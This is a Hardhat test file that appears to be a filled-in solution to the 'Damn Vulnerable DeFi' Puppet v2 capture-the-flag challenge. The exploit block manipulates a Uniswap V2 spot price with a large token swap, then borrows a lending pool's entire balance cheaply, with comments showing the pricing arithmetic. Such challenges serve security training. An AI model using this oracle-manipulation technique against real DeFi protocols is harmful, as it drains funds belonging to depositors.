const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
      /** 
      * @dev
      * Hack: similar to Puppet v1: we manipulate the ETH/token ratio of the AMM liquidity pool to be able to borrow all the DVT funds of the lending pool.
      * The main difference is the use of Uniswap V2 here, which uses WETH to allow for direct transfer between ERC20 tokens. This just means an extra step of swapping some of our ETH to WETH before borrowing the DVT.
      * Method:
      * 
      * 1- swap some of our DVT for WETH in the Uniswap pool => this will shift the spot price of the DVT/WETH pair
      * The UniswapV2 swap price model is as follow:
      * TOKEN2_RECEIVED = 997*DEPOSITED TOKEN1*TOKEN2_RESERVE / (TOKEN1_RESERVE*1000 + 997*DEPOSITED TOKEN1)
      * If we deposit 10000DVT:
      * ETH_RECEIVED = 997 * 10,000 *10 / (100 * 1000 + 997 * 10,000) ~= 9.90069 WETH
      * 
      * 2- After our swap, the DVT/WETH ratio in the pool is now:
      * 1 DVT ~= ((10 - 9.90069)/10100) ETH
      *   Calling the price oracle from the lending pool to check what deposit is required to borrow all the DVT funds in the pool:
      * DEPOSIT_REQUIRED ~= ((10 - 9.90069)/10100) * 1,000,000 * 3 ~= 29.496 WETH
      * Given that we already have 9.9WETH from our swap done beforehand, we simply need to swap 19.6ETH against some WETH to be able to request the loan
      * 
      * 3- Borrow all the DVT tokens from the lending pool       
      */
      await this.token
        .connect(attacker)
        .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

      const logBalanceDVT = async (_address, name) => {
        const _balance = await this.token.balanceOf(_address);
        const reserves = await this.uniswapExchange.getReserves();
        const _balanceWETH = await this.weth.balanceOf(_address);
        const _balanceETHUni = await ethers.provider.getBalance(
          this.uniswapExchange.address
        );
        const _priceBorrow =
          await this.lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
          );
        console.log(
          `\u001b[1;33mDVT Balance of Uniswap:`,
          ethers.utils.formatEther(reserves._reserve0)
        );
        console.log(
          `WETH Balance of Uniswap:`,
          ethers.utils.formatEther(reserves._reserve1)
        );
        console.log(
          `DVT Balance of ${name}:`,
          ethers.utils.formatEther(_balance)
        );
        console.log(
          `WETH Balance of ${name}:`,
          ethers.utils.formatEther(_balanceWETH)
        );
        console.log(
          `\u001b[1;36mTo drain the funds, you need to deposit:`,
          ethers.utils.formatEther(_priceBorrow),
          `WETH`
        );
        console.log('');
      };

      await logBalanceDVT(attacker.address, 'attacker');
      console.log(
        '\u001b[1;35mSwapping all our DVT against WETH in the UNIswap pool'
      );

      await this.uniswapRouter
        .connect(attacker)
        .swapExactTokensForTokens(
          ATTACKER_INITIAL_TOKEN_BALANCE,
          ethers.utils.parseEther('9.9'),
          [this.token.address, this.weth.address],
          attacker.address,
          (await ethers.provider.getBlock('latest')).timestamp * 2
        );

      await logBalanceDVT(attacker.address, 'attacker');
      console.log(
        '\u001b[1;35mExchanging our ETH against WETH in the WETH contract - making sure we keep some for gas'
      );
      await attacker.sendTransaction({
        to: this.weth.address,
        value: ethers.utils.parseEther('19.6'),
      });
      await logBalanceDVT(attacker.address, 'attacker');

      console.log('\u001b[1;35mBorrowing all the funds of the pool: we need to deposit the amount of WETH specified on the log above');
      await this.weth
        .connect(attacker)
        .approve(this.lendingPool.address, ethers.utils.parseEther('29.5'));
      await this.lendingPool
        .connect(attacker)
        .borrow(POOL_INITIAL_TOKEN_BALANCE);
      console.log(
        `\u001b[1;33mDVTBalance of attacker:`,
        ethers.utils.formatEther(await this.token.balanceOf(attacker.address))
      );
      

      /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});